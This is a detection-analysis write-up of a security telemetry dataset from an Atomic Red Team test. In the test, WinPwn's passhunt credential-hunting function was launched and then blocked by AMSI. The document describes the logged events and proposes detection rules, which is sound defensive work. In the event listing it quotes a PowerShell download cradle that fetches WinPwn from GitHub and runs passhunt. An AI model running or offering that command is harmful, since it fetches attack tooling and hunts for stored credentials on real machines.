# T1552.001-10: Credentials In Files — WinPwn passhunt

## Technique Context

T1552.001 (Credentials in Files) covers automated credential hunting across the local filesystem. WinPwn's `passhunt` function performs a targeted search for hardcoded passwords in files across common storage locations. Unlike `sensitivefiles` (test 7) which focuses on file extensions and names, `passhunt` performs content scanning — reading file contents and applying regex patterns to locate password-containing lines. Its targets include application configuration files, Windows Registry hive exports, credential manager databases, browser-stored credentials, and custom application configuration formats.

`passhunt` is the fourth WinPwn test in this series (7, 8, 9, 10). All share the same delivery mechanism: `iex(new-object net.webclient).downloadstring(...)` fetching WinPwn from a pinned GitHub commit. Despite Defender being disabled for this undefended run, AMSI blocked execution — establishing this as a series where technique execution was not achieved in the undefended variant either, making the key comparison point the delivery mechanism artifacts rather than the technique's post-execution footprint.

## What This Dataset Contains

The dataset spans approximately eleven seconds of telemetry (2026-03-17T17:18:15Z–17:18:26Z) across four log sources, with 149 total events.

**Security EID 4688 — three process creates:**
1. `whoami.exe` (PID 0x438c) — ART pre-check
2. Attack `powershell.exe` child (PID 0x4444):
   ```
   "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   passhunt -local $true -noninteractive}
   ```
   The `-local $true` parameter restricts the search to the local machine rather than the domain — reducing scope compared to a domain-wide credential hunt.
3. `whoami.exe` (PID 0x445c) — post-execution check

**Sysmon EID breakdown — 30 events: 17 EID 7, 3 EID 11, 3 EID 1, 3 EID 10, 2 EID 17, 1 EID 22, 1 EID 3:**

- **EID 22 (DNS Query)**: `powershell.exe` (PID 17476) resolved `raw.githubusercontent.com` to `185.199.109.133`, `185.199.110.133`, `185.199.111.133`, and `185.199.108.133`.
- **EID 3 (Network Connection)**: Outbound TCP from `powershell.exe` (PID 17476) to `185.199.109.133` — the download connection.
- **EID 11 (File Create)**: Three file creation events. One is `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`. The second is a `MsMpEng.exe` temp file in `C:\Windows\Temp\01dcb63211e9b764` — the Defender scanning engine processing the downloaded WinPwn content. The third is an Interactive PowerShell profile data file.
- **EID 1 (Process Create)**: Three events — the parent test framework `powershell.exe`, the attack child (PID 17476, tagged `T1059.001`), and one `whoami.exe` (tagged `T1033`).

**PowerShell — 113 events: 110 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 error records the AMSI block. The EID 4103 module log records `New-Object net.webclient`. The three file creation events in Sysmon correspond to partial PowerShell initialization before AMSI fired — more EID 11 events than most other WinPwn tests, suggesting the passhunt invocation partially initialized WinPwn's runtime environment before being terminated.

**Application — 3 EID 15 events:**
Three Defender state-machine events (one more than most other WinPwn tests in this session), reflecting slightly different Defender cycling timing.

## What This Dataset Does Not Contain

The `passhunt` function never ran. No content scanning of configuration files, no password pattern matching, and no credential findings appear. The `-local $true` parameter would have scoped the search to local paths only — `C:\`, user profiles, application data directories — none of which were accessed.

The three Sysmon EID 11 file creation events reflect PowerShell runtime initialization artifacts, not passhunt output. There are no file read events for target credential locations.

## Assessment

This dataset represents the fourth WinPwn test in an uninterrupted sequence. The telemetry pattern is consistent with tests 7, 8, and 9: DNS query to GitHub, TCP connection, PowerShell EID 4100 AMSI block, MsMpEng.exe scanning artifact. The slightly higher EID 11 count (3 vs 1-2 in other tests) suggests the PowerShell child process ran fractionally longer before termination, possibly reflecting `passhunt`'s initialization path starting to prepare the content-scanning regex engine before AMSI fired. This is consistent with the defended analysis noting that "five EID 11 file creates are present — more than typical" — the extra initialization activity is reproducible across both defended and undefended runs. The `-local $true` parameter in the command line is a meaningful operator-intent signal: it indicates the attacker (or the ART test) was scoping to local credential storage rather than performing a domain-wide sweep.

## Detection Opportunities Present in This Data

1. Security EID 4688 command line containing `passhunt` — a unique WinPwn function name with no legitimate use outside post-exploitation.

2. Security EID 4688 command line containing `-local $true` combined with a download cradle — the explicit local scope parameter combined with a fileless download is an intent indicator that can distinguish automated credential hunting from accidental execution.

3. Sysmon EID 1 showing a `powershell.exe` child process with a command line containing both a GitHub raw URL and a WinPwn function name — the download URL pinned to a specific commit hash is a stable, high-fidelity indicator.

4. Sysmon EID 11 from `MsMpEng.exe` creating a file in `C:\Windows\Temp\` within seconds of a PowerShell network connection to GitHub CDN — this three-event sequence (network connection → scanning → temp file) is reliable across the WinPwn test series.

5. PowerShell EID 4104 containing `passhunt` with `-local` parameter and `-noninteractive` — these flags together indicate automated, scripted execution of a credential hunting function.

6. Volume indicator: EID 11 file creates from a single `powershell.exe` process exceeding 3 events in a 10-second window, combined with a prior network connection from that process — elevated file I/O from a network-active script host is a meaningful behavioral anomaly.
